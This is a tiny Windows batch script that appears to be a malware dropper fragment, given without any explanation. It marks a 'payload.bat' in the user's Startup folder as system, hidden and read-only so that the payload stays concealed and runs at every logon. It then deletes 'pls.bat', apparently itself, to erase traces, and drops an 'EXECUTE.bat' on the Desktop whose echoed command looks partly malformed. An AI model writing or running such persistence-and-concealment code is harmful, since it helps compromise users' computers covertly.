@echo off
attrib +s +h +r "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat"
del pls.bat
echo "start %0"> %USERPROFILE%\Desktop\EXECUTE.bat
